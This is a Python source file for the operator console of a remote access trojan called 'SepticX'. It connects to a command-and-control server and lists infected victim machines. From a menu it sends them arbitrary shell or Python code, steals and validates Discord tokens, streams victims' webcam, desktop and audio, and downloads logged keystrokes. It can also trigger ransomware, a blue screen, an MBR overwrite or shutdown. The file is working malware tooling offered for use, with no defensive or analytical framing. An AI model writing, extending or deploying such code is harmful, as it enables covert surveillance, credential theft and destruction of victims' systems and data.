import multiprocessing, threading, requests, base64, json, time, glob, cv2, os, io
from websocket import create_connection
from playsound import playsound
from PIL import Image, ImageTk
from random import randbytes
from termcolor import cprint
import tkinter as tk
os.system("")

class colors():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class main:
    def __init__(self):
      self.computers = None
      self.columns = 4
      self.seperate = 8
      self.indent = " " * int((69/self.columns)-7)

      self.uiprint('Enter your server address')
      self.host = input('> ').replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0]
      print(self.host)

      self.uiprint('Enter your server key')
      self.key = input('> ')

      threading.Thread(target=self.connect).start()
      threading.Thread(target=self.getInput).start()

    def clear(self):
        if os.name == "nt":
          os.system("cls")
        else:
          os.system("clear")

    def uiprint(self, message="", type=None):
        if type == "error":
            print(f"{self.indent}[ ", end="")
            cprint("ERROR", "red", end="")
            print(" ] ", end="")
            cprint(message, "red")

        else:
            print(f"{self.indent}[ ", end="")
            cprint("CONTROLLER", "green", end="")
            print(" ] ", end="")
            cprint(message, "green")

    def connect(self):
        self.ws = create_connection(f"wss://{self.host}/api/ws/computers")
        ws = self.ws
        ws.send(self.key)

        while True:
            try:
                self.computers = json.loads(ws.recv().replace("'", '"'))["computers"]
            except Exception as e:
                self.ws = create_connection(f"wss://{self.host}/api/ws/computers")
                ws = self.ws
                ws.send(self.key)

    def gettokens(self):
        tokens = requests.get(f'https://{self.host}/tokens', data={'key': self.key}).json()
        return tokens

    def check(self, token):
        return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': token}).status_code == 200

    def sendCommand(self, command, target, type=None):
        if type == "cmd":
            command = f'''import subprocess\nsubprocess.call("""{command}""", shell=True)'''

        self.ws.send(json.dumps({
            "code": command,
            "target": target
        }))

    def showComputers(self, Input=True):
        uiprint = self.uiprint
        uiprint("Choose a target:")
        print("", end="\n\n")

        if not self.computers:
            uiprint("No available targets.", "error")
            time.sleep(2.5)
            self.clear()
            self.getInput()

        for count, target in enumerate(self.computers):
            print(f"{self.indent}[", end="")
            cprint(str(count+1), "green", end="")
            print("] ", end="")
            print(target, end="\n\n")

        if Input:
            while True:
                try:
                    choice = int(input(f"{self.indent}>>"))
                    self.target = self.computers[choice-1]
                    break
                except:
                  uiprint("Invalid option!", "error")

        else:
            uiprint("Pres Enter to continue")
            input(f"{self.indent}>>")

    class Audio:
        def __init__(self, target, ctx):
            self.key = ctx.key
            self.host = ctx.host
            self.Stop = False
            self.target = target
            if os.path.exists("/sounds"):
                for f in glob.glob('/sounds'):
                    try:
                        os.remove(f)
                    except Exception as e:
                        print(e)
                        continue
            else:
                os.mkdir("/sounds")
            threading.Thread(target=self.display, args=(target,)).start()
            self.play(target)

        def recv(self, ws):
            self.j = json.loads(ws.recv())

        def play(self, target):
            count = 0
            l = 0

            ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
            ws.send(self.key)
            ws.send(target)
            

            queue = multiprocessing.JoinableQueue()
            threading.Thread(target=self.worker,args=(queue,)).start()
            time.sleep(2)

            while not self.Stop:
                self.j = False

                start = time.time()
                threading.Thread(target=self.recv, args=(ws,)).start()
                while not self.j:
                    if time.time()-start >= 5:
                        return
                j = self.j

                if (time.time()-j["t"] > 10) or (j["t"] < l):
                    print(time.time()-j["t"])
                    print(j["t"] > l)
                    continue

                l = j["t"]
                count += 1

                filename = f"sounds/sound_{count}.wav"

                try:
                    data = base64.b64decode(j["data"])
                    with open(filename, "wb") as file:
                        file.write(data)
                        file.close()
                    queue.put(filename)
                    
                except Exception as e:
                    print(e)
                    ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
                    ws.send(self.key)
                    ws.send(target)

        def worker(self, queue):
            while True:
                sound = queue.get()
                playsound(sound)

        def display(self, target):
            window = tk.Tk()
            window.title("SepticX Client")
            window.geometry("300x300")
            window.configure(background='grey')
            window.protocol("WM_DELETE_WINDOW", self.stop)
            panel = tk.Label(window, text="Playing audio...")
            panel.pack(side="bottom", fill="both", expand="yes")
            self.window = window
            window.mainloop()

        def stop(self):
            self.window.destroy()
            self.Stop = True

    class Video:
        def __init__(self, target, option, ctx):
            self.key = ctx.key
            self.host = ctx.host
            self.Stop = False
            self.display(target, option)

        def edit(self, panel, data):
            try:
                f = io.BytesIO(data)
                pilimage = Image.open(f)
                img = ImageTk.PhotoImage(pilimage)
                panel.configure(image=img)
                panel.image = img
            except Exception as e:
                self.Stop = True

        def update(self, panel, endpoint, ws, target):
            l = time.time()
            while not self.Stop:
                j = json.loads(ws.recv())
                print(time.time()-j["t"])
                if (abs(j["t"]-time.time()) < 1) and (j["t"] > l):
                    continue
                try:
                    data = base64.b64decode(j["data"])
                    threading.Thread(target=self.edit, args=(panel, data)).start()
                except Exception as e:
                    print(e)
                    ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
                    ws.send(self.key)
                    ws.send(target)

        def display(self, target, option):
            window = tk.Tk()
            window.title("SepticX Client")
            window.geometry("300x300")
            window.configure(background='grey')
            if not option:
                endpoint = "showCamera"
            else:
                endpoint = "showScreen"

            ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
            ws.send(self.key)
            ws.send(target)
            w = ws.recv()
            data = base64.b64decode(json.loads(w)["data"])
            f = io.BytesIO(data)
            pilimage = Image.open(f)
            img = ImageTk.PhotoImage(pilimage)
            panel = tk.Label(window, image=img)
            panel.pack(side="bottom", fill="both", expand="yes")

            threading.Thread(target=self.update, args=(panel,endpoint,ws,target)).start()
            window.mainloop()

        def stop(self):
            self.Stop = True

    def getInput(self):
        uiprint = self.uiprint
        columns = self.columns
        length = 15
        options = [
            "Run CMD command", "Run PY file", "Get Discord Tokens", 
            "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
            "Stream Desktop", "Stop Streaming Camera", "Stop Streaming Desktop", 
            "Stream Audio", "Stop Streaming Audio", "Restart Pc", 
            "Start Ransomware", "Start Trollware", "Stop Trollware", 
            "Start BSOD", "Overwrite MBR", "Shutdown Pc", "Logged Tokens", "Logged Keystrokes", "Show Targets"]
        print("""
                  
                                                                                                  
                        ██████╗  █████╗ ███████╗██╗  ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗     
                        ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗    
                        ██║  ██║███████║███████╗███████║██████╔╝██║   ██║███████║██████╔╝██║  ██║    
                        ██║  ██║██╔══██║╚════██║██╔══██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║    
                        ██████╔╝██║  ██║███████║██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝    
                        ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     
========================================================================================================================
Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice B
========================================================================================================================
                                      """.replace("║", f"{colors.GREEN}║{colors.RESET}").replace("╗", f"{colors.GREEN}╗{colors.RESET}").replace("╚", f"{colors.GREEN}╚{colors.RESET}").replace("╝", f"{colors.GREEN}╝{colors.RESET}").replace("═", f"{colors.GREEN}═{colors.RESET}").replace("╔", f"{colors.GREEN}╔{colors.RESET}").replace("|", f"{colors.GREEN}|{colors.RESET}"))

        for count, option in enumerate(options):
            # print(count+1, ((count+1) % 3))
            if (count % columns) == 0:
                print(f"{self.indent}[", end="")
                cprint(str(count+1), "green", end="")
                print("] ", end="")
                print(option, end="")

            else:
                base = len(options[0])
                space = self.seperate - (( len(options[count - 1]) + len(str(count))-1)-base)
                if not count == 0:
                    for _ in range(space):
                      print(" ", end="")
                else:
                      print("        ", end="")
                print("[", end="")
                cprint(str(count+1), "green", end="")
                print("] ", end="")
                print(option, end="")

            if (count % columns) == columns-1:
                print("\n")
            
        print("\n\n\n", end="")

        while True:
            try:
                choice = int(input(f"{self.indent}>>"))
                break
            except KeyboardInterrupt:
                uiprint("Exiting...")
                time.sleep(1)
                os._exit(0)
            except EOFError:
                uiprint("Exiting...")
                time.sleep(1)
                os._exit(0)
            except:
                uiprint("Invalid option!", "error")
                time.sleep(1.5)
                self.clear()
                self.getInput()


        if choice == 1:
            uiprint("Type the command below:")
            print("", end="\n\n")
            command = input(f"{self.indent}>>")
            self.showComputers()
            self.sendCommand(command, self.target, type="cmd")
            uiprint("Sent!")
            time.sleep(1.2)


        elif choice == 2:
            while True:
                try:
                    uiprint("Type the filename below:")
                    filename = input(f"{self.indent}>>")
                    command = open(filename, "r+")
                    break
                except:
                  uiprint("Invalid filename!", "error")

            self.showComputers()
            self.sendCommand(command, self.target)
            uiprint("Sent!")
            time.sleep(1.2)


        elif choice == 3:
            self.showComputers()
            self.sendCommand("sendTokens", self.target)

        elif choice == 4:
            self.showComputers()
            self.sendCommand("nukeTokens", self.target)

        elif choice == 5:
            uiprint("Enter your webhook below:")
            print("", end="\n\n")
            webhook = input(f"{self.indent}>>")
            self.showComputers()
            self.sendCommand(f"updateWebhook:{webhook}", self.target)

        elif choice == 6:
            self.showComputers()
            self.sendCommand("streamCamera", self.target)
            try:
                threading.Thread(target=self.Video, args=(self.target, 0, self)).start()
            except:
                pass

        elif choice == 7:
            self.showComputers()
            self.sendCommand("streamDesktop", self.target)
            try:
                threading.Thread(target=self.Video, args=(self.target, 1, self)).start()
            except:
                pass

        elif choice == 8:
            self.showComputers()
            self.sendCommand("stopDesktop", self.target)

        elif choice == 9:
            self.showComputers()
            self.sendCommand("stopCamera", self.target)

        elif choice == 10:
            self.showComputers()
            self.sendCommand("streamAudio", self.target)
            try:
                threading.Thread(target=self.Audio, args=(self.target, self)).start()
            except Exception as e:
                pass

        elif choice == 11:
            self.showComputers()
            self.sendCommand("stopAudio", self.target)

        elif choice == 12:
            self.showComputers()
            self.sendCommand("restart", self.target)

        elif choice == 13:
            self.showComputers()
            self.sendCommand("startRansomware", self.target)

        elif choice == 14:
            self.showComputers()
            self.sendCommand("Troll", self.target)

        elif choice == 15:
            self.showComputers()
            self.sendCommand("stopTroll", self.target)

        elif choice == 16:
            self.showComputers()
            self.sendCommand("bsod", self.target)

        elif choice == 17:
            self.showComputers()
            self.sendCommand("mbr", self.target)

        elif choice == 18:
            self.showComputers()
            self.sendCommand("shutdown", self.target)

        elif choice == 19:
            tokens = self.gettokens()
            if not tokens:
                self.uiprint('No available tokens.', 'error')
                self.getInput()

            for token in tokens:
                print(f"Token: {token}")
            
            if not self.check(token):
                uiprint('Invalid Token', 'error')
            else:
                uiprint('Valid Token!')

            time.sleep(1.5)

        elif choice == 20:
            uiprint('Downloading logs...')
            download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
            with open('logs.zip', 'wb') as file:
                file.write(download)

            uiprint("Downloaded logs are in 'logs.zip'")
            time.sleep(1.5)



        elif choice == 20:
            self.showComputers(False)

        self.clear()
        self.getInput()


if __name__ == '__main__':
    main()